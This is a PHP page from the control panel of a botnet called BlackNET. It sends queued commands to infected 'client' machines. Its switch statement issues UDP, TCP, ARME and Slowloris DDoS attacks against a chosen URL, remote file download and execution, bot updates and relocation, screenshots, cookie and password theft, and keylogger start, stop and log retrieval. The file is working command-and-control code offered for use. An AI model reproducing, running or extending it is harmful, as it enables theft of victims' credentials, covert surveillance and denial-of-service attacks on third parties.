<?php
require "classes/Database.php";
include 'classes/Clients.php';
include 'session.php';
?>
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <link rel="shortcut icon" href="favico.png">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="Botnet Coded By Black.Hacker">
    <meta name="author" content="Black.Hacker">
    <title>BlackNET - Execute Command</title>
    <link href="asset/vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="asset/vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
    <link href="asset/vendor/datatables/dataTables.bootstrap4.css" rel="stylesheet">
    <link href="asset/css/sb-admin.css" rel="stylesheet">
    <style type="text/css">
      .sticky{
        display: -webkit-box;
        display: -ms-flexbox;
        background-color: #e9ecef;
        height: 80px;
        right: 0;
        bottom: 0; 
        position: absolute;
        display: flex;
        width: 100%;
        flex-shrink: none;
      }
    </style>
  </head>
  <body id="page-top">
    <nav class="navbar navbar-expand-lg  navbar-dark bg-dark">
      <a class="navbar-brand mr-1" href="index.php"><img src="favico.png" width="30" height="30" alt="">BlackNET</a>
  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
    <span class="navbar-toggler-icon"></span>
  </button>
  <div class="collapse navbar-collapse" id="navbarNav">
    <ul class="navbar-nav ml-auto">
      <li class="nav-item">
        <a class="nav-link" href="index.php"><span class="fa fa-home"></span> Home</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="settings.php"><span class="fa fa-wrench"></span> Settings</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" href="changePassword.php"><span class="fa fa-user"></span> Change Password</a>
      </li>
      <li class="nav-item">
        <a class="nav-link" data-toggle="modal" data-target="#logoutModal"><span class="fa fa-sign-out-alt"></span> Logout</a>
      </li>
    </ul>
  </div>
    </nav>
    <div id="wrapper">
      <div id="content-wrapper">
        <div class="container-fluid">
          <ol class="breadcrumb">
            <li class="breadcrumb-item">
              <a href="#">Command Menu</a>
            </li>
          </ol>
          <div class="card mb-3">
            <div class="card-header">
              <i class="fas fa-bolt"></i>
              Command Menu
            </div>
            <div class="card-body">
<?php
        $client = new Clients;
        if (isset($_GET['client'])) {
            $clientHWD = implode(',', $_GET['client']);
        } else {
            echo '<div class="container"><div class="alert alert-danger"><span class="fa fa-times-circle"></span> You did not select a client to execute this command
                 <br> Please go back and choose a client. <br> <a href="index.php">BLACKNET Main Interface</a></div></div>';
            die();
        }


        $command = isset($_GET['command']) ? $_GET['command'] : "nocommand";
        switch ($command){
            case "nocommand":
              echo '<div class="container"><div class="alert alert-danger"><span class="fa fa-times-circle"></span> You did not select a command to execute on the target deveice 
         <br> Please go back and choose a command. <br> <a href="index.php">BLACKNET Main Interface</a></div></div>';
               break;

            case "uninstall":
                Send($clientHWD, "Uninstall");
                $client->removeClient($clientHWD);
                echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Client Has Been Removed</div></div>';
            break;

            case "ddosw":

                if ($_SERVER['REQUEST_METHOD'] == "POST"){
                    if ($_POST['attacktype'] == "UDP Attack")
                    {
                        Send($clientHWD, "StartDDOS|BN|UDPAttack|BN|" . $_POST['TargetURL']);
                    }

                    if ($_POST['attacktype'] == "TCP Attack")
                    {
                        Send($clientHWD, "StartDDOS|BN|TCPAttack|BN|" . $_POST['TargetURL']);

                    }

                    if ($_POST['attacktype'] == "ARME Attack")
                    {
                        Send($clientHWD, "StartDDOS|BN|ARMEAttack|BN|" . $_POST['TargetURL']);
                    }

                    if ($_POST['attacktype'] == "Slowloris Attack")
                    {
                        Send($clientHWD, "StartDDOS|BN|SlowlorisAttack|BN|" . $_POST['TargetURL']);
                    }
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                }
                menu("ddos_attack");
                break;

                case 'stopddos':
                  if ($_SERVER['REQUEST_METHOD'] == "POST"){
                    if ($_POST['attacktype'] == "UDP Attack")
                    {
                        Send($clientHWD, "StopDDOS|BN|UDPAttack");
                    }

                    if ($_POST['attacktype'] == "TCP Attack")
                    {
                        Send($clientHWD, "StopDDOS|BN|TCPAttack");

                    }

                    if ($_POST['attacktype'] == "ARME Attack")
                    {
                        Send($clientHWD, "StopDDOS|BN|ARMEAttack");
                    }

                    if ($_POST['attacktype'] == "Slowloris Attack")
                    {
                        Send($clientHWD, "StopDDOS|BN|SlowlorisAttack");
                    }
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                }
                menu("stop_ddos");
                break;
                
            case "uploadf":

                if ($_SERVER['REQUEST_METHOD'] == "POST")
                {
                    Send($clientHWD, "UploadFile|BN|" . $_POST['FileURL'] . "|BN|" . $_POST['Name']);
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                }
                menu("upload");
                break;

            case "update":

                if ($_SERVER['REQUEST_METHOD'] == "POST")
                {
                    Send($clientHWD, "UpdateClient|BN|" . $_POST['FileURL']);
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                }
                menu("update_client");
                break;

            case "ping":
                Send($clientHWD, "Ping");
                echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                break;

            case "msgbox":
                if ($_SERVER['REQUEST_METHOD'] == "POST")
                {
                    Send($clientHWD, "ShowMessageBox|BN|" . $_POST['Content'] . "|BN|" . $_POST['MessageTitle'] . "|BN|" . $_POST['msgicon'] . "|BN|" . $_POST['msgbutton']);
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                }
                menu("messagebox");
                break;

            case "openwp":
                if ($_SERVER['REQUEST_METHOD'] == "POST")
                {
                    Send($clientHWD, "OpenPage|BN|" . $_POST['Weburl']);
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                }
                menu("openpage");

                break;

            case "openhidden":
                if ($_SERVER['REQUEST_METHOD'] == "POST")
                {
                    Send($clientHWD, "OpenHidden|BN|" . $_POST['Weburl']);
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                }
                menu("openpage");
                break;

            case "close":
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                    $client->updateStatus($clientHWD,"Offline");
                    Send($clientHWD, 'Close');
                break;

            case "moveclient":
                if ($_SERVER['REQUEST_METHOD'] == "POST")
                {
                    Send($clientHWD, "MoveClient|BN|" . $_POST['newHost']);
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                }
                menu("move_bot");           
                break;

            case "blacklist":
            echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Client Has Been Blocked</div></div>';
                Send($clientHWD, 'Blacklist');
                break;

            case 'tkschot':
                echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                Send($clientHWD, 'Screenshot');
                break;

            case 'stealcookie':
                  echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                  Send($clientHWD, 'StealCookie');
                break;


            case 'stealps':
                 echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                 Send($clientHWD, 'InstalledSoftwares');
                break;

           case 'startkl':
               echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
               Send($clientHWD, 'StartKeylogger');
               break;

                case 'stopkl':
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                    Send($clientHWD, 'StopKeylogger');
                    break;

                case 'getlogs':
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                    Send($clientHWD, 'RetriveLogs');
                    break;

                case 'stealpassword':
                    echo '<div class="container"><div class="alert alert-success"><span class="fa fa-check-circle"></span> Command Has Been Send</div></div>';
                    Send($clientHWD,"StealPassword");
                    break;

                default:
                    echo '<div class="container"><div class="alert alert-danger"><span class="fa fa-times-circle"></span> Incorrect Command !!</div></div>';
                    break;
            }

        function Send($USER, $Command){
            try {
                $client = new Clients;
                $client->updateCommands($USER, $Command); 
            } catch (Exception $e) {
                die($e->getMessage());
            }
        }

        function menu($menu_name){
            include "menus/".$menu_name.".html";
        }

?>
        
              </div>
        </div>
      </div>
    </div>

        <footer class="my-sm-10 sticky">
          <div class="container my-auto"> 
            <div class="copyright text-center">
              <span>Copyright © BLACKNET by <a href="http://www.twitter.com/BlackHacker_511">Black.Hacker</a> - <?php echo date('Y'); ?> 
              <br></span>
            </div>
          </div>
        </footer>
        
        <a class="scroll-to-top rounded" href="#page-top">
          <i class="fas fa-angle-up"></i>
        </a>
    <script src="asset/vendor/jquery/jquery.min.js"></script>
    <script src="asset/vendor/bootstrap/js/bootstrap.bundle.min.js"></script>
    <script src="asset/vendor/jquery-easing/jquery.easing.min.js"></script>
    <script src="asset/vendor/datatables/jquery.dataTables.js"></script>
    <script src="asset/vendor/datatables/dataTables.bootstrap4.js"></script>
    <script src="asset/js/sb-admin.min.js"></script>
    <script src="asset/js/demo/datatables-demo.js"></script>
  </body>
</html>